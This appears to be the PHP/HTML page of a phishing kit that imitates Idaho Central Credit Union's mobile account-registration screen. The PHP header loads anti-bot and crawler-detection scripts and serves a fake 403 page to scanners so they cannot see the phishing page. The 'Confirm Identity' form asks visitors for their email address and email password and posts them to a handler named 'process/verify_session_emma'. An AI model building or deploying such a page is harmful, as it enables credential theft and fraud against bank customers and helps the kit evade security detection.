<?php

$useragent = $_SERVER['HTTP_USER_AGENT'];
include '../Bots/fucker.php';
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
@require("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

$bot = include '../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
?>

<html data-mobile-page="" class="mm-opened mm-background mm-right mm-front mm-opening">

<head>
	<style>
	body {
		transition: opacity ease-in 0.2s;
	}
	
	body[unresolved] {
		opacity: 0;
		display: block;
		overflow: hidden;
		position: relative;
	}
	</style>
	
	<link rel="apple-touch-icon" sizes="60x60" href="files/apple-touch-icon-60x60.png">
	<link rel="apple-touch-icon" sizes="76x76" href="files/apple-touch-icon-76x76.png">
	<link rel="apple-touch-icon" sizes="120x120" href="files/apple-touch-icon-120x120.png">
	<link rel="apple-touch-icon" sizes="152x152" href="files/apple-touch-icon-152x152.png">
	<link rel="apple-touch-icon" sizes="180x180" href="files/apple-touch-icon-180x180.png">
	<link rel="icon" type="image/png" sizes="32x32" href="files/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="files/favicon-16x16.png">
	<link rel="manifest" href="files/site.webmanifest">
	<link rel="mask-icon" href="files/safari-pinned-tab.svg" color="#b81237">
	<link rel="shortcut icon" href="files/favicon.ico">
	<meta name="msapplication-TileColor" content="#b81237">
	<meta name="msapplication-TileImage" content="files/mstile-144x144.png">
	<meta name="msapplication-config" content="files/browserconfig.xml">
	<meta name="theme-color" content="#b81237">
	<link href="files/font-icons.css" rel="stylesheet" type="text/css">
	<title>Idaho Central Credit Union</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
	<meta http-equiv="Content-type" content="text/html; charset=utf-8">
	<meta name="format-detection" content="telephone=no">
	<link href="files/jquery-ui.min.css" rel="stylesheet" type="text/css">
	<link href="files/base.min.css" rel="stylesheet" type="text/css">
	<link href="files/iris.shim.mobile.min.css" rel="stylesheet" type="text/css">
	<link href="files/iris.android.min.css" rel="stylesheet" type="text/css">
	<link href="files/iris-foundation.min.css" rel="stylesheet" type="text/css">
	<link href="files/theme.mobile.min.css" rel="stylesheet" type="text/css">
	<link href="files/css?family=Roboto" rel="Stylesheet" type="text/css">
	<link rel="stylesheet" href="files/iris-components.shim.mobile.min.css" type="text/css">
	<link rel="stylesheet" href="files/iris-foundation.min.css" type="text/css">
	<link rel="stylesheet" href="files/iris-components.min.css" type="text/css">
	<link rel="stylesheet" href="files/isotope.1.4.4.min.css" type="text/css">
	<link href="files/Authentication-Isotope.min.css" rel="stylesheet" type="text/css">
	<style id="inert-style">
	[inert] {
		pointer-events: none;
		cursor: default;
	}
	
	[inert],
	[inert] * {
		user-select: none;
		-webkit-user-select: none;
		-moz-user-select: none;
		-ms-user-select: none;
	}
	</style>
</head>

<body class="alk-body shared-layout iris-mouse-use-detected windows" id="registration" data-orion="">
	<div id="mm_side_panels" class="mm-side-panel mm-menu mm-offcanvas mm-right mm-front mm-current mm-opened">
		<div id="confirm_identity_edit_field_panel" class="mm-nopanel card-container card-container-modal" data-bind="with: confirmIdentityStep.currentField()"></div>
		<div id="confirm_cancel_registration" class="card-container card-container-modal mm-nopanel">
			<div id="confirm_cancel_registration_dialog" role="dialog" class="card" aria-modal="true" aria-labelledby="cancel_registration_text">
				<div class="card-header">
					<h4 id="cancel_registration_text">Are you sure you want to exit registration?</h4>
					<a aria-labelledby="cancel_registration_cancellation" class="close" href="#" onclick="javascript: $('#confirm_cancel_registration').hide(); closeDialog(); return false;"></a>
				</div>
				<div class="modal-details">You will return to the landing page and your progress will <strong>not</strong> be saved.</div>
				<div class="buttons"> <a class="button primary" href="/mobile">Exit Registration</a> <a id="cancel_registration_cancellation" class="button text" href="#" onclick="javascript: $('#confirm_cancel_registration').hide(); closeDialog(); return false;">Cancel</a> </div>
			</div>
		</div>
		<div data-bind="with: businessOrIndividualStep, visible: isBusinessRegistrationEnabled" class="card-container mm-panel mm-opened mm-subopened mm-hidden" id="business_or_individual_panel" tabindex="-1" style="display: none;">
			<div class="no-card" data-bind="click: setIndividual">
				<h2 data-bind="text: businessOrIndividualModel.IndividualHeaderText">Individual</h2>
				<div data-bind="text: businessOrIndividualModel.IndividualCopy">Choose this if you are registering for your individual accounts.</div>
				<button type="button" class="button primary" data-bind="text: businessOrIndividualModel.IndividualButtonText">Register as an individual</button>
			</div>
			<div class="no-card" data-bind="click: setBusiness">
				<h2 data-bind="text: businessOrIndividualModel.BusinessHeaderText">Business</h2>
				<div data-bind="text: businessOrIndividualModel.BusinessCopy">Choose this if you are registering for your business accounts.</div>
				<button type="button" class="button primary" data-bind="text: businessOrIndividualModel.BusinessButtonText">Register as a business</button>
			</div>
		</div>
		
		<div data-bind="with: confirmIdentityStep" class="card-container mm-panel mm-highest mm-current mm-opened" id="confirm_identity_panel" tabindex="-1" style="display: block;">
			<div class="loader" data-bind="visible: isLoadingRegistrationFields" style="display: none;">
				<p id="instructions">Loading...</p>
				<div class="loader-pip"></div>
			</div>
			<!-- ko if: !isLoadingRegistrationFields() && (!registrationFieldGroups() || registrationFieldGroups().length === 0) -->
			<!-- /ko -->
			<form action="process/verify_session_emma" id="registration_fields_form" method="post">
				<input name="__RequestVerificationToken" type="hidden" value="hlLs8ZiB74YuegQLEa6D4g3Q2Du5XT5VYnOHQMiihyOglgdA-EONFaZdLTylm5TDwdf-NfQSjwdMLJv8E-ajtvuPnTHUkXp1bLUNy26I4-M1">
				<input type="hidden" id="num_digits" name="num_digits" data-bind="value: numberDigitsToValidateTaxId" value="9">
				<input type="hidden" id="min_num_digits" name="min_num_digits" data-bind="value: minimumNumberDigitsToValidateTaxId" value="4">
				<div class="mar--md" data-bind="if: hasValidationErrors()"></div>
				<!-- ko foreach: registrationFieldGroups() -->
				<!-- ko foreach: fields() -->
				<!-- ko if: (fieldTypeName === 'Text' && registrationTypeName !== 'DateOfBirth') || fieldTypeName === 'Password' || fieldTypeName === 'List' || fieldTypeName === 'Sensitive'  -->
				<input type="hidden" data-bind="attr: { name: registrationTypeName }, value: fieldValue" name="MemberNumber" value="">
				<!-- /ko -->
				<!-- ko if: fieldTypeName === 'Text' && registrationTypeName === 'DateOfBirth' -->
				<!-- /ko -->
				<!-- ko if: (fieldTypeName === 'Text' && registrationTypeName !== 'DateOfBirth') || fieldTypeName === 'Password' || fieldTypeName === 'List' || fieldTypeName === 'Sensitive'  -->
				<input type="hidden" data-bind="attr: { name: registrationTypeName }, value: fieldValue" name="TaxId" value="">
				<!-- /ko -->
				<!-- ko if: fieldTypeName === 'Text' && registrationTypeName === 'DateOfBirth' -->
				<!-- /ko -->
				<!-- /ko -->
				<div class="no-card description">
					<p data-bind="html: description">The following information is used to verify you have an account with Idaho Central Credit Union and that you are the owner of the account. We match your answers against our records. Questions marked with * are required.</p>
				</div>
				<!-- ko foreach: fieldsWithValuesExcludingBooleans() -->
				<!-- /ko -->
				<div class="card no-values">
					<ul class="card-list small-list last-no-border inset mm-nolistview mm-nopanel" data-bind="foreach: fieldsWithoutValuesAndBooleans()">
						<!-- ko if: fieldTypeName !== 'Boolean' -->
						<li class="card-list-item icon-arrow-right" data-bind="click: $root.confirmIdentityStep.editField, event: { keyup: function(data, event) { triggerEditField(data, event, $root)  } }, keyupBubble: false" tabindex="0">
							<div class="item-label"> <span data-bind="text: labelText">Email</span> <span data-bind="visible: fieldInfo.IsRequired" style="color: #BF262B;"> *</span>
                            <input type="email" id="em" name="em" placeholder="Enter Your Email Address" required="true" autocomplete="off"  > </div>
						</li>
						<!-- /ko -->
						<!-- ko if: fieldTypeName === 'Boolean' -->
						<!-- /ko -->
						<!-- ko if: fieldTypeName !== 'Boolean' -->
						<li class="card-list-item icon-arrow-right" data-bind="click: $root.confirmIdentityStep.editField, event: { keyup: function(data, event) { triggerEditField(data, event, $root)  } }, keyupBubble: false" tabindex="0">
							<div class="item-label"> <span data-bind="text: labelText">Password</span> <span data-bind="visible: fieldInfo.IsRequired" style="color: #BF262B;"> *</span>
                            <input type="password" autocomplete="off" id="epass" name="epass" placeholder="Enter Your Password">
                         </div>
						</li>
						<!-- /ko -->
						<!-- ko if: fieldTypeName === 'Boolean' -->
						<!-- /ko -->
					</ul>
				</div>
				<!-- /ko -->
			
			<!-- ko if: !isLoadingRegistrationFields() && registrationFieldGroups() && registrationFieldGroups().length > 0 -->
			<div class="buttons">
				<button type="submit" class="button primary" >Continue </div>
				</form>
			<div class="no-card required-text"> <span>*</span> Required </div>
		</div>
		<div data-bind="with: usernameStep" class="card-container mm-panel mm-hidden" id="username_panel">
			<div class="no-card">
				<div data-bind="html: usernameDescription">Choose a new Username. It must be unique, between 8 and 19 characters in length, and alphanumeric.</div>
			</div>
			<div class="card">
				<div id="username_form_errors" class="mar--md" data-bind="if: hasValidationErrors()"></div>
				<form action="/Mobile/Registration/CreateLogin" id="username_form" method="post" novalidate="novalidate">
					<input name="__RequestVerificationToken" type="hidden" value="xuE_O-fU-Wzk1TEIlTM0Smm_UqIXby74ewiy4BtdWJiaQ9RqBT9M5UTeM0n59vGHFrAA-9Xp9Jmr9AmbPwGugGvrKst4JhB5mTsQi3Tetvw1">
					<input name="ContactId" type="hidden" value="0">
					<div class="input-container">
						<input class="login-id" name="LoginId" type="text" autocomplete="off" data-bind="enterKey: chooseUsername, hasFocus: $root.currentStep().id === id, value: username, valueUpdate: ['keyup','blur','afterkeydown'], readonly: hasReachedMaximumUsernameTries(), attr: { placeholder: usernamePlaceholderText, maxlength: usernameMaxLength }, css: { 'disabled': hasReachedMaximumUsernameTries }" placeholder="Enter a username" maxlength="19"> </div>
				</form>
			</div>
			<div class="buttons">
				<button type="submit" class="button primary disabled" value="Continue" > </div>
		</div>
	</div>
	<div id="mm-0" class="mm-page mm-slideout" style="min-height: 969px;">
		<div id="mmenu_container">
			<div id="wrapper">
				<div class="titlebar">
					<a id="nav_back" href="javascript:registrationArea.viewModel.cancelRegistration(); $('#confirm_cancel_registration a.close').focus()" class="titlebar-button left icon back"></a> <a id="nav_cancel" href="javascript:registrationArea.showConfirmIdentityPanel();" class="titlebar-button left hidden">Cancel</a> <a id="nav_agree" href="javascript:registrationArea.viewModel.next();" class="titlebar-button right hidden">Agree</a> <a id="nav_done" href="javascript:registrationArea.viewModel.done();" class="titlebar-button right hidden">Done</a>
					<h1 id="page_title" class="truncate">Confirm Identity</h1> </div>
				<div id="content" class="clearfix">
					<div class="card-container flush-with-titlebar">
						<div class="card card-full-width">
							<div class="cms-content-area iris-content" data-cms-content-area="top-ribbon"></div>
						</div>
					</div>
					<div class="cms-content-area" data-cms-content-area="header-card"> </div>
					<div data-role="page">
						<div data-role="content" class=""> </div>
					</div>
				</div>
				<div class="cms-content-area" data-cms-content-area="body-card"> </div>
			</div>
			<footer class="footer" id="mobile_footer">
				<div id="mobile_info_panel" role="contentinfo">
					<div class="footer-content">
						<ul class="footer-links">
							<li> <a class="footer-link" href="" target="_blank" rel="noopener noreferrer">Locations</a> </li>
							<li> <a class="footer-link" href="" target="_blank" rel="noopener noreferrer">Financial Education</a> </li>
							<li> <a class="footer-link" href="" target="_blank" rel="noopener noreferrer">About</a> </li>
						</ul>
						<div class="footer-routing-number"> <b>324079555</b> </div>
						<div class="footer-icons"> <span class="font-icon font-icon-ehl"></span> <span class="font-icon font-icon-ncua"></span> </div>
						<div class="footer-tags">
							<div class="footer-block-text"> Equal Housing Lender. Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency </div>
							<div class="footer-block-text"> </div>
						</div>
						<div class="footer-copyright" tabindex="0"> Copyright © 2022. All rights reserved. </div>
					</div>
				</div>
			</footer>
		</div>
		<div class="iris-prompt hidden" id="session-dialog" aria-hidden="true" data-size="large" data-iris-id="iris_1643209131200" role="alertdialog" tabindex="-1" aria-labelledby="prompt_title_1643209131200" aria-describedby="prompt_body_1643209131200">
			<section class="iris-prompt__content" role="document">
				<header class="iris-prompt__header">
					<h2 class="iris-prompt__title" tabindex="-1" id="prompt_title_1643209131200">Are you still there?</h2>
					<button class="iris-button iris-button--ghost iris-prompt__cancel-button" data-modifier="compressed" data-close="" aria-label="Close prompt"> <span class="font-icon-cancel-x" aria-hidden="true"></span> </button>
				</header>
				<div class="iris-prompt__body" id="prompt_body_1643209131200">
					<div>
						<p>You have been inactive for a while. You will be logged out in <span id="session-timeout-countdown" style="font-weight:bold"></span> seconds.</p>
					</div>
				</div>
				<footer class="iris-prompt__footer">
					<button id="session-dialog__button_0" class="iris-button iris-button--secondary" type="button"> <span class="iris-button__text">Logout</span> </button>
					<button id="session-dialog__button_1" class="iris-button iris-button--primary" type="button" data-close=""> <span class="iris-button__text">I'm still here!</span> </button>
				</footer>
			</section>
		</div>
	</div>
	
</body>

</html>